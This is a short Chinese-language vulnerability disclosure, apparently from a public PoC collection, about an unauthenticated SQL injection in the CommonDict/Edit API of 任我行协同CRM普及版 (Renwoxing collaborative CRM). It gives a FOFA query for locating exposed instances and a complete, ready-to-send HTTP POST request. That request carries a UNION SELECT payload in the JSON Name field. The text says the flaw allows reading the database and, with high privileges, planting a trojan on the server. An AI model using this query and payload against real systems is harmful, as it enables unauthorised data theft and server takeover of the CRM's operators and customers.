# 任我行协同CRM普及版Edit存在SQL注入漏洞

任我行协同CRM普及版是由成都市任我行信息技术有限公司开发的一款客户关系管理软件。任我行协同CRM普及版 CommonDict/Edit 接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

## fofa

```javascript
app="任我行-CRM"
```

## poc

```javascript
POST /crm/api/OpenApi/CommonDict/Edit?accesstoken=1&accesskey=1&timestamp=1&nonce=1&signature=1 HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded

enumType=69&data={"ID":"1","Name":"'+UNION+ALL+SELECT+@@VERSION--"}
```

![image-20241122153505463](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202411221535532.png)